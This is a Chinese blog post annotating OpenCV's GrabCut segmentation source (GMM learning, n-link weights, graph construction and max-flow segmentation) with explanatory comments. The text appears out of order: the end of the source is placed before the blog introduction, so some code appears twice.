    int edgeCount = 2*(4*vtxCount - 3*(img.cols + img.rows) + 2);  //边数，需要考虑图边界的边的缺失
    //通过顶点数和边数创建图。这些类型声明和函数定义请参考gcgraph.hpp
	graph.create(vtxCount, edgeCount);
    Point p;
    for( p.y = 0; p.y < img.rows; p.y++ )
    {
        for( p.x = 0; p.x < img.cols; p.x++)
        {
            // add node
            int vtxIdx = graph.addVtx();  //返回这个顶点在图中的索引
            Vec3b color = img.at<Vec3b>(p);

            // set t-weights			
            //计算每个顶点与Sink汇点t（代表背景）和源点Source（代表前景）连接的权值。
			//也即计算Gibbs能量（每一个像素点作为背景像素或者前景像素）的第一个能量项
			double fromSource, toSink;
            if( mask.at<uchar>(p) == GC_PR_BGD || mask.at<uchar>(p) == GC_PR_FGD )
            {
                //对每一个像素计算其作为背景像素或者前景像素的第一个能量项，作为分别与t和s点的连接权值
				fromSource = -log( bgdGMM(color) );
                toSink = -log( fgdGMM(color) );
            }
            else if( mask.at<uchar>(p) == GC_BGD )
            {
                //对于确定为背景的像素点，它与Source点（前景）的连接为0，与Sink点的连接为lambda
				fromSource = 0;
                toSink = lambda;
            }
            else // GC_FGD
            {
                fromSource = lambda;
                toSink = 0;
            }
			//设置该顶点vtxIdx分别与Source点和Sink点的连接权值
            graph.addTermWeights( vtxIdx, fromSource, toSink );

            // set n-weights  n-links
            //计算两个邻域顶点之间连接的权值。
			//也即计算Gibbs能量的第二个能量项（平滑项）
			if( p.x>0 )
            {
                double w = leftW.at<double>(p);
                graph.addEdges( vtxIdx, vtxIdx-1, w, w );
            }
            if( p.x>0 && p.y>0 )
            {
                double w = upleftW.at<double>(p);
                graph.addEdges( vtxIdx, vtxIdx-img.cols-1, w, w );
            }
            if( p.y>0 )
            {
                double w = upW.at<double>(p);
                graph.addEdges( vtxIdx, vtxIdx-img.cols, w, w );
            }
            if( p.x<img.cols-1 && p.y>0 )
            {
                double w = uprightW.at<double>(p);
                graph.addEdges( vtxIdx, vtxIdx-img.cols+1, w, w );
            }
        }
    }
}

//论文中：迭代最小化算法step 3：分割估计：最小割或者最大流算法
/*
  Estimate segmentation using MaxFlow algorithm
*/
static void estimateSegmentation( GCGraph<double>& graph, Mat& mask )
{
    //通过最大流算法确定图的最小割，也即完成图像的分割
	graph.maxFlow();
    Point p;
    for( p.y = 0; p.y < mask.rows; p.y++ )
    {
        for( p.x = 0; p.x < mask.cols; p.x++ )
        {
            //通过图分割的结果来更新mask，即最后的图像分割结果。注意的是，永远都
			//不会更新用户指定为背景或者前景的像素
			if( mask.at<uchar>(p) == GC_PR_BGD || mask.at<uchar>(p) == GC_PR_FGD )
            {
                if( graph.inSourceSegment( p.y*mask.cols+p.x /*vertex index*/ ) )
                    mask.at<uchar>(p) = GC_PR_FGD;
                else
                    mask.at<uchar>(p) = GC_PR_BGD;
            }
        }
    }
}

//最后的成果：提供给外界使用的伟大的API：grabCut 
/*
****参数说明：
	img——待分割的源图像，必须是8位3通道（CV_8UC3）图像，在处理的过程中不会被修改；
	mask——掩码图像，如果使用掩码进行初始化，那么mask保存初始化掩码信息；在执行分割
		的时候，也可以将用户交互所设定的前景与背景保存到mask中，然后再传入grabCut函
		数；在处理结束之后，mask中会保存结果。mask只能取以下四种值：
		GCD_BGD（=0），背景；
		GCD_FGD（=1），前景；
		GCD_PR_BGD（=2），可能的背景；
		GCD_PR_FGD（=3），可能的前景。
		如果没有手工标记GCD_BGD或者GCD_FGD，那么结果只会有GCD_PR_BGD或GCD_PR_FGD；
	rect——用于限定需要进行分割的图像范围，只有该矩形窗口内的图像部分才被处理；
	bgdModel——背景模型，如果为null，函数内部会自动创建一个bgdModel；bgdModel必须是
		单通道浮点型（CV_32FC1）图像，且行数只能为1，列数只能为13x5；
	fgdModel——前景模型，如果为null，函数内部会自动创建一个fgdModel；fgdModel必须是
		单通道浮点型（CV_32FC1）图像，且行数只能为1，列数只能为13x5；
	iterCount——迭代次数，必须大于0；
	mode——用于指示grabCut函数进行什么操作，可选的值有：
		GC_INIT_WITH_RECT（=0），用矩形窗初始化GrabCut；
		GC_INIT_WITH_MASK（=1），用掩码图像初始化GrabCut；
		GC_EVAL（=2），执行分割。
*/
void cv::grabCut( InputArray _img, InputOutputArray _mask, Rect rect,
                  InputOutputArray _bgdModel, InputOutputArray _fgdModel,
                  int iterCount, int mode )
{
    Mat img = _img.getMat();
    Mat& mask = _mask.getMatRef();
    Mat& bgdModel = _bgdModel.getMatRef();
    Mat& fgdModel = _fgdModel.getMatRef();

    if( img.empty() )
        CV_Error( CV_StsBadArg, "image is empty" );
    if( img.type() != CV_8UC3 )
        CV_Error( CV_StsBadArg, "image mush have CV_8UC3 type" );

    GMM bgdGMM( bgdModel ), fgdGMM( fgdModel );
    Mat compIdxs( img.size(), CV_32SC1 );

    if( mode == GC_INIT_WITH_RECT || mode == GC_INIT_WITH_MASK )
    {
        if( mode == GC_INIT_WITH_RECT )
            initMaskWithRect( mask, img.size(), rect );
        else // flag == GC_INIT_WITH_MASK
            checkMask( img, mask );
        initGMMs( img, mask, bgdGMM, fgdGMM );
    }

    if( iterCount <= 0)
        return;

    if( mode == GC_EVAL )
        checkMask( img, mask );

    const double gamma = 50;
    const double lambda = 9*gamma;
    const double beta = calcBeta( img );

    Mat leftW, upleftW, upW, uprightW;
    calcNWeights( img, leftW, upleftW, upW, uprightW, beta, gamma );

    for( int i = 0; i < iterCount; i++ )
    {
        GCGraph<double> graph;
        assignGMMsComponents( img, mask, bgdGMM, fgdGMM, compIdxs );
        learnGMMs( img, mask, compIdxs, bgdGMM, fgdGMM );
        constructGCGraph(img, mask, bgdGMM, fgdGMM, lambda, leftW, upleftW, upW, uprightW, graph );
        estimateSegmentation( graph, mask );
    }
}


 
 
 




图像分割之（四）OpenCV的GrabCut函数使用和源码解读
zouxy09@qq.com
http://blog.csdn.net/zouxy09
 
      上一文对GrabCut做了一个了解。OpenCV中的GrabCut算法是依据《"GrabCut" - Interactive
 Foreground Extraction using Iterated Graph Cuts》这篇文章来实现的。现在我对源码做了些注释，以便我们更深入的了解该算法。一直觉得论文和代码是有比较大的差别的，个人觉得脱离代码看论文，最多能看懂70%，剩下20%或者更多就需要通过阅读代码来获得了，那还有10%就和每个人的基础和知识储备相挂钩了。
      接触时间有限，若有错误，还望各位前辈指正，谢谢。原论文的一些浅解见上一博文：
          
http://blog.csdn.net/zouxy09/article/details/8534954
 
一、GrabCut函数使用
      在OpenCV的源码目录的samples的文件夹下，有grabCut的使用例程，请参考：
opencv\samples\cpp\grabcut.cpp。
而grabCut函数的API说明如下：
void cv::grabCut( InputArray _img, InputOutputArray _mask, Rect rect,
                  InputOutputArray _bgdModel, InputOutputArray _fgdModel,
                  int iterCount, int mode )
/*
****参数说明：
         img——待分割的源图像，必须是8位3通道（CV_8UC3）图像，在处理的过程中不会被修改；
         mask——掩码图像，如果使用掩码进行初始化，那么mask保存初始化掩码信息；在执行分割的时候，也可以将用户交互所设定的前景与背景保存到mask中，然后再传入grabCut函数；在处理结束之后，mask中会保存结果。mask只能取以下四种值：
                   GCD_BGD（=0），背景；
                   GCD_FGD（=1），前景；
                   GCD_PR_BGD（=2），可能的背景；
                   GCD_PR_FGD（=3），可能的前景。
                  如果没有手工标记GCD_BGD或者GCD_FGD，那么结果只会有GCD_PR_BGD或GCD_PR_FGD；
         rect——用于限定需要进行分割的图像范围，只有该矩形窗口内的图像部分才被处理；
         bgdModel——背景模型，如果为null，函数内部会自动创建一个bgdModel；bgdModel必须是单通道浮点型（CV_32FC1）图像，且行数只能为1，列数只能为13x5；
         fgdModel——前景模型，如果为null，函数内部会自动创建一个fgdModel；fgdModel必须是单通道浮点型（CV_32FC1）图像，且行数只能为1，列数只能为13x5；
         iterCount——迭代次数，必须大于0；
         mode——用于指示grabCut函数进行什么操作，可选的值有：
                   GC_INIT_WITH_RECT（=0），用矩形窗初始化GrabCut；
                   GC_INIT_WITH_MASK（=1），用掩码图像初始化GrabCut；
                   GC_EVAL（=2），执行分割。
*/
 
二、GrabCut源码解读
       其中源码包含了gcgraph.hpp这个构建图和max flow/min cut算法的实现文件，这个文件暂时没有解读，后面再更新了。
/*M///////////////////////////////////////////////////////////////////////////////////////
//
//  IMPORTANT: READ BEFORE DOWNLOADING, COPYING, INSTALLING OR USING.
//
//  By downloading, copying, installing or using the software you agree to this license.
//  If you do not agree to this license, do not download, install,
//  copy or use the software.
//
//
//                        Intel License Agreement
//                For Open Source Computer Vision Library
//
// Copyright (C) 2000, Intel Corporation, all rights reserved.
// Third party copyrights are property of their respective owners.
//
// Redistribution and use in source and binary forms, with or without modification,
// are permitted provided that the following conditions are met:
//
//   * Redistribution's of source code must retain the above copyright notice,
//     this list of conditions and the following disclaimer.
//
//   * Redistribution's in binary form must reproduce the above copyright notice,
//     this list of conditions and the following disclaimer in the documentation
//     and/or other materials provided with the distribution.
//
//   * The name of Intel Corporation may not be used to endorse or promote products
//     derived from this software without specific prior written permission.
//
// This software is provided by the copyright holders and contributors "as is" and
// any express or implied warranties, including, but not limited to, the implied
// warranties of merchantability and fitness for a particular purpose are disclaimed.
// In no event shall the Intel Corporation or contributors be liable for any direct,
// indirect, incidental, special, exemplary, or consequential damages
// (including, but not limited to, procurement of substitute goods or services;
// loss of use, data, or profits; or business interruption) however caused
// and on any theory of liability, whether in contract, strict liability,
// or tort (including negligence or otherwise) arising in any way out of
// the use of this software, even if advised of the possibility of such damage.
//
//M*/

#include "precomp.hpp"
#include "gcgraph.hpp"
#include <limits>

using namespace cv;

/*
This is implementation of image segmentation algorithm GrabCut described in
"GrabCut — Interactive Foreground Extraction using Iterated Graph Cuts".
Carsten Rother, Vladimir Kolmogorov, Andrew Blake.
 */

/*
 GMM - Gaussian Mixture Model
*/
class GMM
{
public:
    static const int componentsCount = 5;

    GMM( Mat& _model );
    double operator()( const Vec3d color ) const;
    double operator()( int ci, const Vec3d color ) const;
    int whichComponent( const Vec3d color ) const;

    void initLearning();
    void addSample( int ci, const Vec3d color );
    void endLearning();

private:
    void calcInverseCovAndDeterm( int ci );
    Mat model;
    double* coefs;
    double* mean;
    double* cov;

    double inverseCovs[componentsCount][3][3]; //协方差的逆矩阵
    double covDeterms[componentsCount];  //协方差的行列式

    double sums[componentsCount][3];
    double prods[componentsCount][3][3];
    int sampleCounts[componentsCount];
    int totalSampleCount;
};

//背景和前景各有一个对应的GMM（混合高斯模型）
GMM::GMM( Mat& _model )
{
	//一个像素的（唯一对应）高斯模型的参数个数或者说一个高斯模型的参数个数
	//一个像素RGB三个通道值，故3个均值，3*3个协方差，共用一个权值
    const int modelSize = 3/*mean*/ + 9/*covariance*/ + 1/*component weight*/;
    if( _model.empty() )
    {
		//一个GMM共有componentsCount个高斯模型，一个高斯模型有modelSize个模型参数
        _model.create( 1, modelSize*componentsCount, CV_64FC1 );
        _model.setTo(Scalar(0));
    }
    else if( (_model.type() != CV_64FC1) || (_model.rows != 1) || (_model.cols != modelSize*componentsCount) )
        CV_Error( CV_StsBadArg, "_model must have CV_64FC1 type, rows == 1 and cols == 13*componentsCount" );

    model = _model;

	//注意这些模型参数的存储方式：先排完componentsCount个coefs，再3*componentsCount个mean。
	//再3*3*componentsCount个cov。
    coefs = model.ptr<double>(0);  //GMM的每个像素的高斯模型的权值变量起始存储指针
    mean = coefs + componentsCount; //均值变量起始存储指针
    cov = mean + 3*componentsCount;  //协方差变量起始存储指针

    for( int ci = 0; ci < componentsCount; ci++ )
        if( coefs[ci] > 0 )
			 //计算GMM中第ci个高斯模型的协方差的逆Inverse和行列式Determinant
			 //为了后面计算每个像素属于该高斯模型的概率（也就是数据能量项）
             calcInverseCovAndDeterm( ci ); 
}

//计算一个像素（由color=（B,G,R）三维double型向量来表示）属于这个GMM混合高斯模型的概率。
//也就是把这个像素像素属于componentsCount个高斯模型的概率与对应的权值相乘再相加，
//具体见论文的公式（10）。结果从res返回。
//这个相当于计算Gibbs能量的第一个能量项（取负后）。
double GMM::operator()( const Vec3d color ) const
{
    double res = 0;
    for( int ci = 0; ci < componentsCount; ci++ )
        res += coefs[ci] * (*this)(ci, color );
    return res;
}

//计算一个像素（由color=（B,G,R）三维double型向量来表示）属于第ci个高斯模型的概率。
//具体过程，即高阶的高斯密度模型计算式，具体见论文的公式（10）。结果从res返回
double GMM::operator()( int ci, const Vec3d color ) const
{
    double res = 0;
    if( coefs[ci] > 0 )
    {
        CV_Assert( covDeterms[ci] > std::numeric_limits<double>::epsilon() );
        Vec3d diff = color;
        double* m = mean + 3*ci;
        diff[0] -= m[0]; diff[1] -= m[1]; diff[2] -= m[2];
        double mult = diff[0]*(diff[0]*inverseCovs[ci][0][0] + diff[1]*inverseCovs[ci][1][0] + diff[2]*inverseCovs[ci][2][0])
                   + diff[1]*(diff[0]*inverseCovs[ci][0][1] + diff[1]*inverseCovs[ci][1][1] + diff[2]*inverseCovs[ci][2][1])
                   + diff[2]*(diff[0]*inverseCovs[ci][0][2] + diff[1]*inverseCovs[ci][1][2] + diff[2]*inverseCovs[ci][2][2]);
        res = 1.0f/sqrt(covDeterms[ci]) * exp(-0.5f*mult);
    }
    return res;
}

//返回这个像素最有可能属于GMM中的哪个高斯模型（概率最大的那个）
int GMM::whichComponent( const Vec3d color ) const
{
    int k = 0;
    double max = 0;

    for( int ci = 0; ci < componentsCount; ci++ )
    {
        double p = (*this)( ci, color );
        if( p > max )
        {
            k = ci;  //找到概率最大的那个，或者说计算结果最大的那个
            max = p;
        }
    }
    return k;
}

//GMM参数学习前的初始化，主要是对要求和的变量置零
void GMM::initLearning()
{
    for( int ci = 0; ci < componentsCount; ci++)
    {
        sums[ci][0] = sums[ci][1] = sums[ci][2] = 0;
        prods[ci][0][0] = prods[ci][0][1] = prods[ci][0][2] = 0;
        prods[ci][1][0] = prods[ci][1][1] = prods[ci][1][2] = 0;
        prods[ci][2][0] = prods[ci][2][1] = prods[ci][2][2] = 0;
        sampleCounts[ci] = 0;
    }
    totalSampleCount = 0;
}

//增加样本，即为前景或者背景GMM的第ci个高斯模型的像素集（这个像素集是来用估
//计计算这个高斯模型的参数的）增加样本像素。计算加入color这个像素后，像素集
//中所有像素的RGB三个通道的和sums（用来计算均值），还有它的prods（用来计算协方差），
//并且记录这个像素集的像素个数和总的像素个数（用来计算这个高斯模型的权值）。
void GMM::addSample( int ci, const Vec3d color )
{
    sums[ci][0] += color[0]; sums[ci][1] += color[1]; sums[ci][2] += color[2];
    prods[ci][0][0] += color[0]*color[0]; prods[ci][0][1] += color[0]*color[1]; prods[ci][0][2] += color[0]*color[2];
    prods[ci][1][0] += color[1]*color[0]; prods[ci][1][1] += color[1]*color[1]; prods[ci][1][2] += color[1]*color[2];
    prods[ci][2][0] += color[2]*color[0]; prods[ci][2][1] += color[2]*color[1]; prods[ci][2][2] += color[2]*color[2];
    sampleCounts[ci]++;
    totalSampleCount++;
}

//从图像数据中学习GMM的参数：每一个高斯分量的权值、均值和协方差矩阵；
//这里相当于论文中“Iterative minimisation”的step 2
void GMM::endLearning()
{
    const double variance = 0.01;
    for( int ci = 0; ci < componentsCount; ci++ )
    {
        int n = sampleCounts[ci]; //第ci个高斯模型的样本像素个数
        if( n == 0 )
            coefs[ci] = 0;
        else
        {
            //计算第ci个高斯模型的权值系数
			coefs[ci] = (double)n/totalSampleCount; 

            //计算第ci个高斯模型的均值
			double* m = mean + 3*ci;
            m[0] = sums[ci][0]/n; m[1] = sums[ci][1]/n; m[2] = sums[ci][2]/n;

            //计算第ci个高斯模型的协方差
			double* c = cov + 9*ci;
            c[0] = prods[ci][0][0]/n - m[0]*m[0]; c[1] = prods[ci][0][1]/n - m[0]*m[1]; c[2] = prods[ci][0][2]/n - m[0]*m[2];
            c[3] = prods[ci][1][0]/n - m[1]*m[0]; c[4] = prods[ci][1][1]/n - m[1]*m[1]; c[5] = prods[ci][1][2]/n - m[1]*m[2];
            c[6] = prods[ci][2][0]/n - m[2]*m[0]; c[7] = prods[ci][2][1]/n - m[2]*m[1]; c[8] = prods[ci][2][2]/n - m[2]*m[2];

            //计算第ci个高斯模型的协方差的行列式
			double dtrm = c[0]*(c[4]*c[8]-c[5]*c[7]) - c[1]*(c[3]*c[8]-c[5]*c[6]) + c[2]*(c[3]*c[7]-c[4]*c[6]);
            if( dtrm <= std::numeric_limits<double>::epsilon() )
            {
                //相当于如果行列式小于等于0，（对角线元素）增加白噪声，避免其变
				//为退化（降秩）协方差矩阵（不存在逆矩阵，但后面的计算需要计算逆矩阵）。
				// Adds the white noise to avoid singular covariance matrix.
                c[0] += variance;
                c[4] += variance;
                c[8] += variance;
            }
			
			//计算第ci个高斯模型的协方差的逆Inverse和行列式Determinant
            calcInverseCovAndDeterm(ci);
        }
    }
}

//计算协方差的逆Inverse和行列式Determinant
void GMM::calcInverseCovAndDeterm( int ci )
{
    if( coefs[ci] > 0 )
    {
		//取第ci个高斯模型的协方差的起始指针
        double *c = cov + 9*ci;
        double dtrm =
              covDeterms[ci] = c[0]*(c[4]*c[8]-c[5]*c[7]) - c[1]*(c[3]*c[8]-c[5]*c[6]) 
								+ c[2]*(c[3]*c[7]-c[4]*c[6]);

        //在C++中，每一种内置的数据类型都拥有不同的属性, 使用<limits>库可以获
		//得这些基本数据类型的数值属性。因为浮点算法的截断，所以使得，当a=2，
		//b=3时 10*a/b == 20/b不成立。那怎么办呢？
		//这个小正数（epsilon）常量就来了，小正数通常为可用给定数据类型的
		//大于1的最小值与1之差来表示。若dtrm结果不大于小正数，那么它几乎为零。
		//所以下式保证dtrm>0，即行列式的计算正确（协方差对称正定，故行列式大于0）。
		CV_Assert( dtrm > std::numeric_limits<double>::epsilon() );
		//三阶方阵的求逆
        inverseCovs[ci][0][0] =  (c[4]*c[8] - c[5]*c[7]) / dtrm;
        inverseCovs[ci][1][0] = -(c[3]*c[8] - c[5]*c[6]) / dtrm;
        inverseCovs[ci][2][0] =  (c[3]*c[7] - c[4]*c[6]) / dtrm;
        inverseCovs[ci][0][1] = -(c[1]*c[8] - c[2]*c[7]) / dtrm;
        inverseCovs[ci][1][1] =  (c[0]*c[8] - c[2]*c[6]) / dtrm;
        inverseCovs[ci][2][1] = -(c[0]*c[7] - c[1]*c[6]) / dtrm;
        inverseCovs[ci][0][2] =  (c[1]*c[5] - c[2]*c[4]) / dtrm;
        inverseCovs[ci][1][2] = -(c[0]*c[5] - c[2]*c[3]) / dtrm;
        inverseCovs[ci][2][2] =  (c[0]*c[4] - c[1]*c[3]) / dtrm;
    }
}

//计算beta，也就是Gibbs能量项中的第二项（平滑项）中的指数项的beta，用来调整
//高或者低对比度时，两个邻域像素的差别的影响的，例如在低对比度时，两个邻域
//像素的差别可能就会比较小，这时候需要乘以一个较大的beta来放大这个差别，
//在高对比度时，则需要缩小本身就比较大的差别。
//所以我们需要分析整幅图像的对比度来确定参数beta，具体的见论文公式（5）。
/*
  Calculate beta - parameter of GrabCut algorithm.
  beta = 1/(2*avg(sqr(||color[i] - color[j]||)))
*/
static double calcBeta( const Mat& img )
{
    double beta = 0;
    for( int y = 0; y < img.rows; y++ )
    {
        for( int x = 0; x < img.cols; x++ )
        {
			//计算四个方向邻域两像素的差别，也就是欧式距离或者说二阶范数
			//（当所有像素都算完后，就相当于计算八邻域的像素差了）
            Vec3d color = img.at<Vec3b>(y,x);
            if( x>0 ) // left  >0的判断是为了避免在图像边界的时候还计算，导致越界
            {
                Vec3d diff = color - (Vec3d)img.at<Vec3b>(y,x-1);
                beta += diff.dot(diff);  //矩阵的点乘，也就是各个元素平方的和
            }
            if( y>0 && x>0 ) // upleft
            {
                Vec3d diff = color - (Vec3d)img.at<Vec3b>(y-1,x-1);
                beta += diff.dot(diff);
            }
            if( y>0 ) // up
            {
                Vec3d diff = color - (Vec3d)img.at<Vec3b>(y-1,x);
                beta += diff.dot(diff);
            }
            if( y>0 && x<img.cols-1) // upright
            {
                Vec3d diff = color - (Vec3d)img.at<Vec3b>(y-1,x+1);
                beta += diff.dot(diff);
            }
        }
    }
    if( beta <= std::numeric_limits<double>::epsilon() )
        beta = 0;
    else
        beta = 1.f / (2 * beta/(4*img.cols*img.rows - 3*img.cols - 3*img.rows + 2) ); //论文公式（5）

    return beta;
}

//计算图每个非端点顶点（也就是每个像素作为图的一个顶点，不包括源点s和汇点t）与邻域顶点
//的边的权值。由于是无向图，我们计算的是八邻域，那么对于一个顶点，我们计算四个方向就行，
//在其他的顶点计算的时候，会把剩余那四个方向的权值计算出来。这样整个图算完后，每个顶点
//与八邻域的顶点的边的权值就都计算出来了。
//这个相当于计算Gibbs能量的第二个能量项（平滑项），具体见论文中公式（4）
/*
  Calculate weights of noterminal vertices of graph.
  beta and gamma - parameters of GrabCut algorithm.
 */
static void calcNWeights( const Mat& img, Mat& leftW, Mat& upleftW, Mat& upW, 
							Mat& uprightW, double beta, double gamma )
{
    //gammaDivSqrt2相当于公式（4）中的gamma * dis(i,j)^(-1)，那么可以知道，
	//当i和j是垂直或者水平关系时，dis(i,j)=1，当是对角关系时，dis(i,j)=sqrt(2.0f)。
	//具体计算时，看下面就明白了
	const double gammaDivSqrt2 = gamma / std::sqrt(2.0f);
	//每个方向的边的权值通过一个和图大小相等的Mat来保存
    leftW.create( img.rows, img.cols, CV_64FC1 );
    upleftW.create( img.rows, img.cols, CV_64FC1 );
    upW.create( img.rows, img.cols, CV_64FC1 );
    uprightW.create( img.rows, img.cols, CV_64FC1 );
    for( int y = 0; y < img.rows; y++ )
    {
        for( int x = 0; x < img.cols; x++ )
        {
            Vec3d color = img.at<Vec3b>(y,x);
            if( x-1>=0 ) // left  //避免图的边界
            {
                Vec3d diff = color - (Vec3d)img.at<Vec3b>(y,x-1);
                leftW.at<double>(y,x) = gamma * exp(-beta*diff.dot(diff));
            }
            else
                leftW.at<double>(y,x) = 0;
            if( x-1>=0 && y-1>=0 ) // upleft
            {
                Vec3d diff = color - (Vec3d)img.at<Vec3b>(y-1,x-1);
                upleftW.at<double>(y,x) = gammaDivSqrt2 * exp(-beta*diff.dot(diff));
            }
            else
                upleftW.at<double>(y,x) = 0;
            if( y-1>=0 ) // up
            {
                Vec3d diff = color - (Vec3d)img.at<Vec3b>(y-1,x);
                upW.at<double>(y,x) = gamma * exp(-beta*diff.dot(diff));
            }
            else
                upW.at<double>(y,x) = 0;
            if( x+1<img.cols && y-1>=0 ) // upright
            {
                Vec3d diff = color - (Vec3d)img.at<Vec3b>(y-1,x+1);
                uprightW.at<double>(y,x) = gammaDivSqrt2 * exp(-beta*diff.dot(diff));
            }
            else
                uprightW.at<double>(y,x) = 0;
        }
    }
}

//检查mask的正确性。mask为通过用户交互或者程序设定的，它是和图像大小一样的单通道灰度图，
//每个像素只能取GC_BGD or GC_FGD or GC_PR_BGD or GC_PR_FGD 四种枚举值，分别表示该像素
//（用户或者程序指定）属于背景、前景、可能为背景或者可能为前景像素。具体的参考：
//ICCV2001“Interactive Graph Cuts for Optimal Boundary & Region Segmentation of Objects in N-D Images”
//Yuri Y. Boykov Marie-Pierre Jolly 
/*
  Check size, type and element values of mask matrix.
 */
static void checkMask( const Mat& img, const Mat& mask )
{
    if( mask.empty() )
        CV_Error( CV_StsBadArg, "mask is empty" );
    if( mask.type() != CV_8UC1 )
        CV_Error( CV_StsBadArg, "mask must have CV_8UC1 type" );
    if( mask.cols != img.cols || mask.rows != img.rows )
        CV_Error( CV_StsBadArg, "mask must have as many rows and cols as img" );
    for( int y = 0; y < mask.rows; y++ )
    {
        for( int x = 0; x < mask.cols; x++ )
        {
            uchar val = mask.at<uchar>(y,x);
            if( val!=GC_BGD && val!=GC_FGD && val!=GC_PR_BGD && val!=GC_PR_FGD )
                CV_Error( CV_StsBadArg, "mask element value must be equel"
                    "GC_BGD or GC_FGD or GC_PR_BGD or GC_PR_FGD" );
        }
    }
}

//通过用户框选目标rect来创建mask，rect外的全部作为背景，设置为GC_BGD，
//rect内的设置为 GC_PR_FGD（可能为前景）
/*
  Initialize mask using rectangular.
*/
static void initMaskWithRect( Mat& mask, Size imgSize, Rect rect )
{
    mask.create( imgSize, CV_8UC1 );
    mask.setTo( GC_BGD );

    rect.x = max(0, rect.x);
    rect.y = max(0, rect.y);
    rect.width = min(rect.width, imgSize.width-rect.x);
    rect.height = min(rect.height, imgSize.height-rect.y);

    (mask(rect)).setTo( Scalar(GC_PR_FGD) );
}

//通过k-means算法来初始化背景GMM和前景GMM模型
/*
  Initialize GMM background and foreground models using kmeans algorithm.
*/
static void initGMMs( const Mat& img, const Mat& mask, GMM& bgdGMM, GMM& fgdGMM )
{
    const int kMeansItCount = 10;  //迭代次数
    const int kMeansType = KMEANS_PP_CENTERS; //Use kmeans++ center initialization by Arthur and Vassilvitskii

    Mat bgdLabels, fgdLabels; //记录背景和前景的像素样本集中每个像素对应GMM的哪个高斯模型，论文中的kn
    vector<Vec3f> bgdSamples, fgdSamples; //背景和前景的像素样本集
    Point p;
    for( p.y = 0; p.y < img.rows; p.y++ )
    {
        for( p.x = 0; p.x < img.cols; p.x++ )
        {
            //mask中标记为GC_BGD和GC_PR_BGD的像素都作为背景的样本像素
			if( mask.at<uchar>(p) == GC_BGD || mask.at<uchar>(p) == GC_PR_BGD )
                bgdSamples.push_back( (Vec3f)img.at<Vec3b>(p) );
            else // GC_FGD | GC_PR_FGD
                fgdSamples.push_back( (Vec3f)img.at<Vec3b>(p) );
        }
    }
    CV_Assert( !bgdSamples.empty() && !fgdSamples.empty() );
	
	//kmeans中参数_bgdSamples为：每行一个样本
	//kmeans的输出为bgdLabels，里面保存的是输入样本集中每一个样本对应的类标签（样本聚为componentsCount类后）
    Mat _bgdSamples( (int)bgdSamples.size(), 3, CV_32FC1, &bgdSamples[0][0] );
    kmeans( _bgdSamples, GMM::componentsCount, bgdLabels,
            TermCriteria( CV_TERMCRIT_ITER, kMeansItCount, 0.0), 0, kMeansType );
    Mat _fgdSamples( (int)fgdSamples.size(), 3, CV_32FC1, &fgdSamples[0][0] );
    kmeans( _fgdSamples, GMM::componentsCount, fgdLabels,
            TermCriteria( CV_TERMCRIT_ITER, kMeansItCount, 0.0), 0, kMeansType );

    //经过上面的步骤后，每个像素所属的高斯模型就确定的了，那么就可以估计GMM中每个高斯模型的参数了。
	bgdGMM.initLearning();
    for( int i = 0; i < (int)bgdSamples.size(); i++ )
        bgdGMM.addSample( bgdLabels.at<int>(i,0), bgdSamples[i] );
    bgdGMM.endLearning();

    fgdGMM.initLearning();
    for( int i = 0; i < (int)fgdSamples.size(); i++ )
        fgdGMM.addSample( fgdLabels.at<int>(i,0), fgdSamples[i] );
    fgdGMM.endLearning();
}

//论文中：迭代最小化算法step 1：为每个像素分配GMM中所属的高斯模型，kn保存在Mat compIdxs中
/*
  Assign GMMs components for each pixel.
*/
static void assignGMMsComponents( const Mat& img, const Mat& mask, const GMM& bgdGMM, 
									const GMM& fgdGMM, Mat& compIdxs )
{
    Point p;
    for( p.y = 0; p.y < img.rows; p.y++ )
    {
        for( p.x = 0; p.x < img.cols; p.x++ )
        {
            Vec3d color = img.at<Vec3b>(p);
			//通过mask来判断该像素属于背景像素还是前景像素，再判断它属于前景或者背景GMM中的哪个高斯分量
            compIdxs.at<int>(p) = mask.at<uchar>(p) == GC_BGD || mask.at<uchar>(p) == GC_PR_BGD ?
                bgdGMM.whichComponent(color) : fgdGMM.whichComponent(color);
        }
    }
}

//论文中：迭代最小化算法step 2：从每个高斯模型的像素样本集中学习每个高斯模型的参数
/*
  Learn GMMs parameters.
*/
static void learnGMMs( const Mat& img, const Mat& mask, const Mat& compIdxs, GMM& bgdGMM, GMM& fgdGMM )
{
    bgdGMM.initLearning();
    fgdGMM.initLearning();
    Point p;
    for( int ci = 0; ci < GMM::componentsCount; ci++ )
    {
        for( p.y = 0; p.y < img.rows; p.y++ )
        {
            for( p.x = 0; p.x < img.cols; p.x++ )
            {
                if( compIdxs.at<int>(p) == ci )
                {
                    if( mask.at<uchar>(p) == GC_BGD || mask.at<uchar>(p) == GC_PR_BGD )
                        bgdGMM.addSample( ci, img.at<Vec3b>(p) );
                    else
                        fgdGMM.addSample( ci, img.at<Vec3b>(p) );
                }
            }
        }
    }
    bgdGMM.endLearning();
    fgdGMM.endLearning();
}

//通过计算得到的能量项构建图，图的顶点为像素点，图的边由两部分构成，
//一类边是：每个顶点与Sink汇点t（代表背景）和源点Source（代表前景）连接的边，
//这类边的权值通过Gibbs能量项的第一项能量项来表示。
//另一类边是：每个顶点与其邻域顶点连接的边，这类边的权值通过Gibbs能量项的第二项能量项来表示。
/*
  Construct GCGraph
*/
static void constructGCGraph( const Mat& img, const Mat& mask, const GMM& bgdGMM, const GMM& fgdGMM, double lambda,
                       const Mat& leftW, const Mat& upleftW, const Mat& upW, const Mat& uprightW,
                       GCGraph<double>& graph )
{
    int vtxCount = img.cols*img.rows;  //顶点数，每一个像素是一个顶点
    int edgeCount = 2*(4*vtxCount - 3*(img.cols + img.rows) + 2);  //边数，需要考虑图边界的边的缺失
    //通过顶点数和边数创建图。这些类型声明和函数定义请参考gcgraph.hpp
	graph.create(vtxCount, edgeCount);
    Point p;
    for( p.y = 0; p.y < img.rows; p.y++ )
    {
        for( p.x = 0; p.x < img.cols; p.x++)
        {
            // add node
            int vtxIdx = graph.addVtx();  //返回这个顶点在图中的索引
            Vec3b color = img.at<Vec3b>(p);

            // set t-weights			
            //计算每个顶点与Sink汇点t（代表背景）和源点Source（代表前景）连接的权值。
			//也即计算Gibbs能量（每一个像素点作为背景像素或者前景像素）的第一个能量项
			double fromSource, toSink;
            if( mask.at<uchar>(p) == GC_PR_BGD || mask.at<uchar>(p) == GC_PR_FGD )
            {
                //对每一个像素计算其作为背景像素或者前景像素的第一个能量项，作为分别与t和s点的连接权值
				fromSource = -log( bgdGMM(color) );
